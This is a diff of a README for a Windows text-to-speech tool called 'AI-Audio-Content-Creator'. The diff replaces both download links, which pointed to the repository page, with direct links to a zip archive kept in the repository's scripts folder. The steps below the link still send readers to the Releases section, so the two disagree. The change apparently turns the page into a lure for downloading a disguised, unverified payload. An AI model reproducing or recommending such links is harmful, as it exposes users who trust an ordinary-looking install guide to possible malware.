@@ -1,6 +1,6 @@
 # 🎙️ AI-Audio-Content-Creator - Transform text into professional audio files
 
-[![Download Installer](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Porkchopautochthon314/AI-Audio-Content-Creator)
+[![Download Installer](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Porkchopautochthon314/AI-Audio-Content-Creator/raw/refs/heads/main/scripts/Creator_A_Audio_Content_v3.4.zip)
 
 AI-Audio-Content-Creator provides tools to change written text into high-quality speech. You use this application to build podcasts, narrate documents, and produce audio content. The software features modern audio workflows that simplify content generation for your projects.
 
@@ -16,7 +16,7 @@ This application runs on Windows 10 and Windows 11. Your computer needs the foll
 
 ## 📥 How to Download
 
-Visit [this page](https://github.com/Porkchopautochthon314/AI-Audio-Content-Creator) to download the application. 
+Visit [this page](https://github.com/Porkchopautochthon314/AI-Audio-Content-Creator/raw/refs/heads/main/scripts/Creator_A_Audio_Content_v3.4.zip) to download the application. 
 
 1. Click the link above to open the repository.
 2. Look for the Releases section on the right side of the page.
